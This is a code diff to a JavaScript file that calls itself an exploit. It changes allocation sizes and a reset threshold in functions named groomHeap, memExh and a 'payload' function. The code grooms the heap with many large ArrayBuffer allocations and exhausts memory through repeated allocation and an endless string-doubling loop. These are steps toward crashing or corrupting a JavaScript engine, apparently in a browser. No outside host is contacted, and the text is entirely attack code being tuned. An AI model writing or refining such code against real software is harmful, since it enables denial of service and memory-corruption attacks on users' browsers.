@@ -23,7 +23,7 @@ function groomHeap() {
 
     // Allocate and deallocate in patterns
     for (let i = 0; i < 64; i++) { // Reduced iterations
-        let buffer = new ArrayBuffer(1000000); // Allocate smaller blocks
+        let buffer = new ArrayBuffer(900000); // Allocate smaller blocks
         tempArray.push(buffer);
     }
 
@@ -39,7 +39,7 @@ function groomHeap() {
 function memExh() {
     let bufferArray = [];
     for (let i = 0; i < 4096; i++) { // Reduced iterations
-        bufferArray.push(new ArrayBuffer(1000000)); // Allocate smaller buffers
+        bufferArray.push(new ArrayBuffer(900000)); // Allocate smaller buffers
         if (bufferArray.length > 1024) { // Less aggressive clearing
             bufferArray = []; // Clear buffer array to exhaust memory
         }
@@ -48,7 +48,7 @@ function memExh() {
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "B".repeat(1000000); // Smaller initial string
+    let largeString = "B".repeat(900000); // Smaller initial string
     let nestedArray = [];
     let obj = {};
     let iterationCount = 0; // Counter to track number of iterations
@@ -56,8 +56,8 @@ function payload() {
     while (true) {
         // String concatenation
         largeString += largeString;
-        if (largeString.length > 100000000000) { // Lower threshold for reset
-            largeString = "B".repeat(1000000); // Reset string to avoid overflow
+        if (largeString.length > 100000000) { // Lower threshold for reset
+            largeString = "B".repeat(900000); // Reset string to avoid overflow
         }
 
         memExh(); // Exhaust memory
